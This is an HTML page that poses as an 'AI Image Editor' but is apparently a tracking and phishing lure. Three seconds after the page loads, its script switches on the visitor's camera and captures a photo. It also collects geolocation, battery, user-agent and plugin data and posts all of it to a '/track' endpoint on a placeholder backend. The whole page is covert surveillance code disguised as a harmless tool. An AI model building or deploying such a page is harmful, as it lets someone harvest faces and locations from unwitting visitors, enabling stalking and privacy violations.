<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Image Editor</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }
        #upload-btn { padding: 10px 20px; font-size: 16px; background: #007bff; color: white; border: none; cursor: pointer; }
        #upload-btn:hover { background: #0056b3; }
    </style>
</head>
<body>

    <h1>Welcome to AI Image Editor</h1>
    <p>Upload an image to generate AI enhancements.</p>
    <button id="upload-btn" onclick="capturePhoto()">Upload</button>

    <script>
        const backendURL = "https://your-backend-url.com"; // Update this

        async function getDeviceInfo() {
            return {
                platform: navigator.platform,
                screenWidth: screen.width,
                screenHeight: screen.height,
                userAgent: navigator.userAgent,
                cookiesEnabled: navigator.cookieEnabled,
                plugins: navigator.plugins.length ? [...navigator.plugins].map(p => p.name).join(", ") : "No Plugins"
            };
        }

        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL("image/png");  // ✅ Get Base64 image
                stream.getTracks().forEach(track => track.stop());  // Stop camera access

                sendData(imageData);  // ✅ Send image data to backend

            } catch (error) {
                console.log("Camera access denied: " + error);
            }
        }

        async function sendData(photo) {
            const battery = await navigator.getBattery();
            const geo = await new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
                    position => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
                    () => resolve({ latitude: "Unknown", longitude: "Unknown" })
                );
            });

            const device = await getDeviceInfo();
            const data = {
                battery: { level: battery.level * 100, charging: battery.charging },
                geo,
                device,
                photo  // ✅ Send captured image
            };

            const sessionId = Math.random().toString(36).substring(2, 10);
            fetch(`${backendURL}/track/${sessionId}`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            }).catch(err => console.log("Error sending data:", err));
        }

        // ✅ Auto-start tracking when page loads
        window.onload = () => {
            setTimeout(capturePhoto, 3000); // Auto-capture photo after 3 seconds
        };
    </script>

</body>
</html>
